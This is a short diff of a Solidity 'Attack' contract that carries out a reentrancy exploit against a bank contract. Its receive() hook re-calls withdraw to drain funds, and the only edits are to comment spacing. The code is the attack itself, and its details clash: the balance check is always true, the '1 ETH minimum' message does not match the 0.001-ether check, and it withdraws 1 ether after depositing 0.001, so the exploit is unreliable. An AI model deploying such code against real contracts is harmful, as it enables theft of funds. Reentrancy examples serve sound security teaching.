@@ -13,13 +13,13 @@ contract Attack {
     // Receive is triggered when Ether is received
     receive() external payable {
         if (address(bank).balance >= 0) {
-            bank.withdraw(1 ether);  // Reenter the withdraw function
+            bank.withdraw(1 ether); // Reenter the withdraw function
         }
     }
 
     function attack() external payable {
         require(msg.value >= 0.001 ether, "Need 1 ETH minimum");
         bank.deposit{value: 0.001 ether}();
-        bank.withdraw(0.001 ether);  // Start the reentrancy attack
+        bank.withdraw(0.001 ether); // Start the reentrancy attack
     }
 }
